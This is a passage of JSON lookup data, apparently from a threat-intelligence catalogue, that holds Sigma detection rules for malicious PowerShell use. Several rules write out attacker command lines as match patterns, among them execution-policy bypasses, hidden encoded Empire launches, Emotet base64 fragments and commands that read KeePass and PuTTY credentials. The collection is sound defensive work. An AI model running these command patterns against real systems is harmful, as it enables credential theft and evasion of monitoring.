                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell download command\ndetection:\n  condition: webclient and download\n  download:\n    ScriptBlockText|contains:\n    - .DownloadFile(\n    - .DownloadString(\n  webclient:\n    ScriptBlockText|contains: System.Net.WebClient\nfalsepositives:\n- PowerShell scripts that download content from the Internet\nid: 403c2cc0-7f6b-4925-9423-bfa573bed7eb\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nrelated:\n- id: 65531a81-a694-4e31-ae04-f8ba5bc33759\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Download - Powershell Script\n",
                            "sigma:id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb",
                            "title": "Suspicious PowerShell Download - Powershell Script",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
                        "lookup_data": {
                            "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
                            "raw": "author: pH-T (Nextron Systems), Nasreddine Bencherchali\ndate: 2022/03/15\ndescription: Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: /TN TVInstallRestore\n    Image|endswith: \\schtasks.exe\n    ParentImage|contains|all:\n    - \\AppData\\Local\\Temp\\\n    - TeamViewer_.exe\n  selection:\n    CommandLine|contains:\n    - NT AUT\n    - ' SYSTEM '\n    CommandLine|contains|all:\n    - /Create\n    - /RU\n    - /TR\n    - C:\\Users\\\n    - \\AppData\\Local\\\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Unknown\nid: c5c00f49-b3f9-45a6-997e-cfdecc6e1967\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/28\nreferences:\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Suspicious Schtasks Execution AppData Folder\n",
                            "sigma:id": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
                            "title": "Suspicious Schtasks Execution AppData Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ebdf49d8-b89c-46c9-8fdf-2c308406f6bd",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Clip.exe in Scripts\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: (?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*\nfalsepositives:\n- Unknown\nid: ebdf49d8-b89c-46c9-8fdf-2c308406f6bd\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: db92dd33-a3ad-49cf-8c2c-608c3e30ace0\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Clip - PowerShell Module\n",
                            "sigma:id": "ebdf49d8-b89c-46c9-8fdf-2c308406f6bd",
                            "title": "Invoke-Obfuscation Via Use Clip - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
                        "lookup_data": {
                            "description": "Detects activity mentioned in Operation Wocao report",
                            "raw": "author: Florian Roth (Nextron Systems), frack113\ndate: 2019/12/20\ndescription: Detects activity mentioned in Operation Wocao report\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - checkadmin.exe 127.0.0.1 -all\n    - netsh advfirewall firewall add rule name=powershell dir=in\n    - cmd /c powershell.exe -ep bypass -file c:\\s.ps1\n    - /tn win32times /f\n    - create win32times binPath=\n    - \\c$\\windows\\system32\\devmgr.dll\n    - ' -exec bypass -enc JgAg'\n    - type *keepass\\KeePass.config.xml\n    - iie.exe iie.txt\n    - reg query HKEY_CURRENT_USER\\Software\\\\*\\PuTTY\\Sessions\\\nfalsepositives:\n- Administrators that use checkadmin.exe tool to enumerate local administrators\nid: 1cfac73c-be78-4f9a-9b08-5bde0c3953ab\nlevel: high\nlogsource:\n  category: process_creation\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/\n- https://twitter.com/SBousseaden/status/1207671369963646976\nrelated:\n- id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d\n  type: derived\nstatus: test\ntags:\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1036.004\n- attack.t1027\n- attack.execution\n- attack.t1053.005\n- attack.t1059.001\ntitle: Operation Wocao Activity\n",
                            "sigma:id": "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
                            "title": "Operation Wocao Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18",
                        "lookup_data": {
                            "description": "Detects all Emotet like process executions that are not covered by the more generic rules",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/09/30\ndescription: Detects all Emotet like process executions that are not covered by the\n  more generic rules\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains:\n    - fAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQ\n    - wAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUA\n    - 8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlA\n  selection:\n    CommandLine|contains:\n    - ' -e* PAA'\n    - JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ\n    - QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA\n    - kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA\n    - IgAoACcAKgAnACkAOwAkA\n    - IAKAAnACoAJwApADsAJA\n    - iACgAJwAqACcAKQA7ACQA\n    - JABGAGwAeAByAGgAYwBmAGQ\n    - PQAkAGUAbgB2ADoAdABlAG0AcAArACgA\n    - 0AJABlAG4AdgA6AHQAZQBtAHAAKwAoA\n    - 9ACQAZQBuAHYAOgB0AGUAbQBwACsAKA\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/27\nreferences:\n- https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/\n- https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/\n- https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/\n- https://app.any.run/tasks/84fc9b4a-ea2b-47b1-8aa6-9014402dfb56/\nstatus: stable\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\ntitle: Emotet Process Creation\n",
                            "sigma:id": "d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18",
                            "title": "Emotet Process Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1f21ec3f-810d-4b0e-8045-322202e22b4b",
                        "lookup_data": {
                            "description": "Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range')",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/13\ndescription: Detects a Powershell process that opens network connections - check for\n  suspicious target ports and target systems - adjust to your environment (e.g. extend\n  filters with company's ip range')\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_internal_ip:\n    DestinationIp|startswith:\n    - '10.'\n    - 192.168.\n    - 172.16.\n    - 172.17.\n    - 172.18.\n    - 172.19.\n    - 172.20.\n    - 172.21.\n    - 172.22.\n    - 172.23.\n    - 172.24.\n    - 172.25.\n    - 172.26.\n    - 172.27.\n    - 172.28.\n    - 172.29.\n    - 172.30.\n    - 172.31.\n    - 127.0.0.1\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  filter_ipv6:\n    DestinationIp|startswith:\n    - ::1\n    - 0:0:0:0:0:0:0:1\n    - 'fe80:'\n    - fc\n    - fd\n  filter_msrange:\n    DestinationIp|startswith:\n    - 20.184.\n    - 20.185.\n    - 20.186.\n    - 20.187.\n    - 20.188.\n    - 20.189.\n    - 20.190.\n    - 20.191.\n    - 23.79.\n    - 51.10.\n    - 51.103.\n    - 51.104.\n    - 51.105.\n    - 52.239.\n  selection:\n    DestinationIsIpv6: 'false'\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    Initiated: 'true'\nfalsepositives:\n- Administrative scripts\n- Microsoft IP range\nid: 1f21ec3f-810d-4b0e-8045-322202e22b4b\nlevel: low\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2023/01/20\nreferences:\n- https://www.youtube.com/watch?v=DLtJTxMWZ2o\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Network Connections\n",
                            "sigma:id": "1f21ec3f-810d-4b0e-8045-322202e22b4b",
                            "title": "PowerShell Network Connections",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
                        "lookup_data": {
                            "description": "Detects suspicious powershell command line parameters used in Empire",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/04/20\ndescription: Detects suspicious powershell command line parameters used in Empire\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -NoP -sta -NonI -W Hidden -Enc '\n    - ' -noP -sta -w 1 -enc '\n    - ' -NoP -NonI -W Hidden -enc '\n    - ' -noP -sta -w 1 -enc'\n    - ' -enc  SQB'\n    - ' -nop -exec bypass -EncodedCommand '\nfalsepositives:\n- Other tools that incidentally use the same command line parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Empire PowerShell Launch Parameters\n",
                            "sigma:id": "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
                            "title": "Empire PowerShell Launch Parameters",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cd0f7229-d16f-42de-8fe3-fba365fbcb3a",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Rundll32 in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Rundll32 in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - value\n    - invoke\n    - comspec\n    - iex\n    ServiceFileName|contains|all:\n    - '&&'\n    - rundll32\n    - shell32.dll\n    - shellexec_rundll\nfalsepositives:\n- Unknown\nid: cd0f7229-d16f-42de-8fe3-fba365fbcb3a\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 641a4bfb-c017-44f7-800c-2aee0184ce9b\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Rundll32 - Security\n",
                            "sigma:id": "cd0f7229-d16f-42de-8fe3-fba365fbcb3a",
                            "title": "Invoke-Obfuscation Via Use Rundll32 - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a746c9b8-a2fb-4ee5-a428-92bee9e99060",
                        "lookup_data": {
                            "description": "This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n",
                            "raw": "author: Agro (@agro_sev) oscd.communitly\ndate: 2020/10/13\ndescription: 'This rule detects execution of a PowerShell code through the sqltoolsps.exe\n  utility, which is included in the standard set of utilities supplied with the Microsoft\n  SQL Server Management studio.\n\n  Script blocks are not logged in this case, so this utility helps to bypass protection\n  mechanisms based on the analysis of these logs.\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    ParentImage|endswith: \\smss.exe\n  selection:\n  - Image|endswith: \\sqltoolsps.exe\n  - ParentImage|endswith: \\sqltoolsps.exe\n  - OriginalFileName: \\sqltoolsps.exe\nfalsepositives:\n- Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe\n  spawned by smss.exe is a legitimate action.\nid: a746c9b8-a2fb-4ee5-a428-92bee9e99060\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/02/25\nreferences:\n- https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml\n- https://twitter.com/pabraeken/status/993298228840992768\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1127\ntitle: SQL Client Tools PowerShell Session Detection\n",
                            "sigma:id": "a746c9b8-a2fb-4ee5-a428-92bee9e99060",
                            "title": "SQL Client Tools PowerShell Session Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0152550d-3a26-4efd-9f0e-54a0b28ae2f3",
                        "lookup_data": {
                            "description": "This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n",
                            "raw": "author: Agro (@agro_sev) oscd.community\ndate: 2020/10/10\ndescription: 'This rule detects execution of a PowerShell code through the sqlps.exe\n  utility, which is included in the standard set of utilities supplied with the MSSQL\n  Server.\n\n  Script blocks are not logged in this case, so this utility helps to bypass protection\n  mechanisms based on the analysis of these logs.\n\n  '\ndetection:\n  condition: selection_parent or (selection_image and not filter_image)\n  filter_image:\n    ParentImage|endswith: \\sqlagent.exe\n  selection_image:\n  - Image|endswith: \\sqlps.exe\n  - OriginalFileName: sqlps.exe\n  selection_parent:\n    ParentImage|endswith: \\sqlps.exe\nfalsepositives:\n- Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe\n  spawned by sqlagent.exe is a legitimate action.\nid: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://docs.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/\n- https://twitter.com/bryon_/status/975835709587075072\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1127\ntitle: Detection of PowerShell Execution via Sqlps.exe\n",
                            "sigma:id": "0152550d-3a26-4efd-9f0e-54a0b28ae2f3",
                            "title": "Detection of PowerShell Execution via Sqlps.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6c6c6282-7671-4fe9-a0ce-a2dcebdc342b",
                        "lookup_data": {
                            "description": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)\nAdversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\n",
                            "raw": "author: frack113\ndate: 2022/01/19\ndescription: 'Adversaries may abuse PowerShell commands and scripts for execution.\n\n  PowerShell is a powerful interactive command-line interface and scripting environment\n  included in the Windows operating system. (Citation: TechNet PowerShell)\n\n  Adversaries can use PowerShell to perform a number of actions, including discovery\n  of information and execution of code\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_exec:\n    ScriptBlockText|contains:\n    - 'IEX '\n    - 'Invoke-Expression '\n    - 'Invoke-Command '\n    - ICM -\n  selection_xml:\n    ScriptBlockText|contains|all:\n    - New-Object\n    - System.Xml.XmlDocument\n    - .Load\nfalsepositives:\n- Legitimate administrative script\nid: 6c6c6282-7671-4fe9-a0ce-a2dcebdc342b\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-8---powershell-xml-requests\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Powershell XML Execute Command\n",
                            "sigma:id": "6c6c6282-7671-4fe9-a0ce-a2dcebdc342b",
                            "title": "Powershell XML Execute Command",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "80b708f3-d034-40e4-a6c8-d23b7a7db3d1",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/12\ndescription: Detects Obfuscated Powershell via Stdin in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - environment\n    - invoke\n    - ${input)\n    ServiceFileName|contains|all:\n    - set\n    - '&&'\nfalsepositives:\n- Unknown\nid: 80b708f3-d034-40e4-a6c8-d23b7a7db3d1\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 487c7524-f892-4054-b263-8a0ace63fc25\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Stdin - Security\n",
                            "sigma:id": "80b708f3-d034-40e4-a6c8-d23b7a7db3d1",
                            "title": "Invoke-Obfuscation Via Stdin - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8c7090c3-e0a0-4944-bd08-08c3a0cecf79",
                        "lookup_data": {
                            "description": "Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia",
                            "raw": "author: '@41thexplorer, Microsoft Defender ATP'\ndate: 2019/11/12\ndescription: Detects TropicTrooper activity, an actor who targeted high-profile organizations\n  in the energy and food and beverage sectors in Asia\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc\nid: 8c7090c3-e0a0-4944-bd08-08c3a0cecf79\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/08/27\nreferences:\n- https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/\nstatus: stable\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: TropicTrooper Campaign November 2018\n",
                            "sigma:id": "8c7090c3-e0a0-4944-bd08-08c3a0cecf79",
                            "title": "TropicTrooper Campaign November 2018",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
                        "lookup_data": {
                            "description": "Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's \"load powershell\" extension.",
                            "raw": "author: Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton\ndate: 2019/11/14\ndescription: Detects loading of essential DLL used by PowerShell, but not by the process\n  powershell.exe. Detects meterpreter's \"load powershell\" extension.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_aurora:\n    Image: null\n  filter_generic:\n  - Image:\n    - C:\\Windows\\System32\\dsac.exe\n    - C:\\Program Files\\PowerShell\\7\\pwsh.exe\n  - Image|endswith:\n    - \\powershell.exe\n    - \\powershell_ise.exe\n    - \\WINDOWS\\System32\\sdiagnhost.exe\n    - \\mscorsvw.exe\n    - \\WINDOWS\\System32\\RemoteFXvGPUDisablement.exe\n    - \\sqlps.exe\n    - \\wsmprovhost.exe\n    - \\winrshost.exe\n    - \\syncappvpublishingserver.exe\n    - \\runscripthelper.exe\n    - \\ServerManager.exe\n    - \\Microsoft SQL Server Management Studio *\\Common*\\IDE\\Ssms.exe\n    - \\IDE\\devenv.exe\n    - \\ServiceHub.VSDetouredHost.exe\n    - \\ServiceHub.SettingsHost.exe\n    - \\ServiceHub.Host.CLR.x86.exe\n    - \\Citrix\\ConfigSync\\ConfigSyncRun.exe\n  - Image|startswith:\n    - C:\\Program Files (x86)\\Microsoft Visual Studio\\\n    - C:\\Program Files\\Microsoft Visual Studio\\\n  filter_nextron:\n    Image|endswith:\n    - \\thor64.exe\n    - \\thor.exe\n    Image|startswith: C:\\Windows\\Temp\\asgard2-agent\\\n  selection:\n    ImageLoaded|endswith:\n    - \\System.Management.Automation.Dll\n    - \\System.Management.Automation.ni.Dll\nfalsepositives:\n- Used by some .NET binaries, minimal on user workstation.\n- Used by Microsoft SQL Server Management Studio\nid: 092bc4b9-3d1d-43b4-a6b4-8c8acd83522f\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/10/10\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/p3nt4/PowerShdll\nrelated:\n- id: 867613fb-fa60-4497-a017-a82df74a172c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.t1059.001\n- attack.execution\ntitle: In-memory PowerShell\n",
                            "sigma:id": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
                            "title": "In-memory PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7034cbbb-cc55-4dc2-8dad-36c0b942e8f1",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via COMPRESS OBFUSCATION\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|contains:\n    - system.io.compression.deflatestream\n    - system.io.streamreader\n    Payload|contains|all:\n    - new-object\n    - text.encoding]::ascii\n    Payload|endswith: readtoend\nfalsepositives:\n- Unknown\nid: 7034cbbb-cc55-4dc2-8dad-36c0b942e8f1\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 20e5497e-331c-4cd5-8d36-935f6e2a9a07\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell Module\n",
                            "sigma:id": "7034cbbb-cc55-4dc2-8dad-36c0b942e8f1",
                            "title": "Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94",
                        "lookup_data": {
                            "description": "Detects signs of potential use of the WSMAN provider from uncommon processes locally and remote execution.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/06/24\ndescription: Detects signs of potential use of the WSMAN provider from uncommon processes\n  locally and remote execution.\ndetection:\n  commandline_null:\n    CommandLine: null\n  condition: ( request_client or respond_server ) and not 1 of filter* and not ( svchost\n    and commandline_null )\n  filter_citrix:\n    Image|startswith: C:\\Program Files\\Citrix\\\n  filter_general:\n    Image|endswith:\n    - \\powershell.exe\n    - C:\\Windows\\System32\\sdiagnhost.exe\n    - C:\\Windows\\System32\\services.exe\n  filter_mscorsvw:\n    Image|endswith: \\mscorsvw.exe\n    Image|startswith:\n    - C:\\Windows\\Microsoft.NET\\Framework64\\v\n    - C:\\Windows\\Microsoft.NET\\Framework\\v\n  filter_nextron:\n    Image|startswith: C:\\Windows\\Temp\\asgard2-agent\\\n  filter_ps_ise:\n    Image|endswith: \\powershell_ise.exe\n  filter_svchost:\n    CommandLine|contains:\n    - svchost.exe -k netsvcs -p -s BITS\n    - svchost.exe -k GraphicsPerfSvcGroup -s GraphicsPerfSvc\n    - svchost.exe -k NetworkService -p -s Wecsvc\n    - svchost.exe -k netsvcs\n  filter_svr_2019:\n    Image:\n    - C:\\Windows\\System32\\Configure-SMRemoting.exe\n    - C:\\Windows\\System32\\ServerManager.exe\n  filter_upgrade:\n    Image|startswith: C:\\$WINDOWS.~BT\\Sources\\\n  request_client:\n  - ImageLoaded|endswith:\n    - \\WsmSvc.dll\n    - \\WsmAuto.dll\n    - \\Microsoft.WSMan.Management.ni.dll\n  - OriginalFileName:\n    - WsmSvc.dll\n    - WSMANAUTOMATION.DLL\n    - Microsoft.WSMan.Management.dll\n  respond_server:\n    Image|endswith: \\svchost.exe\n    OriginalFileName: WsmWmiPl.dll\n  svchost:\n    Image|endswith: \\svchost.exe\nfalsepositives:\n- Unknown\nid: ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://twitter.com/chadtilbury/status/1275851297770610688\n- https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/\n- https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-architecture\n- https://github.com/bohops/WSMan-WinRM\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.003\ntitle: Suspicious WSMAN Provider Image Loads\n",
                            "sigma:id": "ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94",
                            "title": "Suspicious WSMAN Provider Image Loads",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "64e8e417-c19a-475a-8d19-98ea705394cc",
                        "lookup_data": {
                            "description": "Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/11\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking\n  for powershell.exe\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_adace:\n    ContextInfo|contains: C:\\Windows\\system32\\dsac.exe\n  filter_citrix:\n    ContextInfo|contains: ConfigSyncRun.exe\n  filter_help_update:\n    Payload|contains:\n    - Update-Help\n    - Failed to update Help for the module\n  filter_powershell:\n    ContextInfo|contains:\n    - = powershell\n    - = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell\n    - = C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell\n    - = C:/Windows/System32/WindowsPowerShell/v1.0/powershell\n    - = C:/Windows/SysWOW64/WindowsPowerShell/v1.0/powershell\n  filter_sdiagnhost:\n    ContextInfo|contains: = C:\\WINDOWS\\System32\\sdiagnhost.exe -Embedding\n  filter_winrm:\n    ContextInfo|contains: C:\\Windows\\system32\\wsmprovhost.exe -Embedding\n  selection:\n    ContextInfo|contains: '*'\nfalsepositives:\n- Programs using PowerShell directly without invocation of a dedicated interpreter\n- MSP Detection Searcher\n- Citrix ConfigSync.ps1\nid: 64e8e417-c19a-475a-8d19-98ea705394cc\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/13\nreferences:\n- https://threathunterplaybook.com/hunts/windows/190610-PwshAlternateHosts/notebook.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Alternate PowerShell Hosts - PowerShell Module\n",
                            "sigma:id": "64e8e417-c19a-475a-8d19-98ea705394cc",
                            "title": "Alternate PowerShell Hosts - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ca8b77a9-d499-4095-b793-5d5f330d450e",
                        "lookup_data": {
                            "description": "Detects PowerShell calling a credential prompt",
